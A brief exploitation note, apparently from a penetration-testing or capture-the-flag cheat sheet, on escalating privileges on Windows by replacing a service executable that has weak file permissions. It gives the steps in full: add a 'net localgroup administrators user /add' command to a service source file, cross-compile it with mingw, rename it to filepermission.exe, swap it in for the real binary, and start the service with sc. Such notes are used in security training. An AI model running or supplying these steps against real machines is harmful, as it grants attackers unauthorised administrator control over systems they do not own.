For exploitation get the both source file named windows_dll.c  and windows_service.c and 

open windows_service.c and in the command system add
`cmd.exe /k net localgroup administrators user /add` 
and just compile the file using here the name of user is "user" but replace this with the "user-name" of the windows machine you want to escalate

`x86_64-w64-mingw32-gcc windows_service.c -o x.exe `

rename it as filepermission.exe
then replace that with current file and type


`sc start filepermsvc`

and done we have added our user to administrators
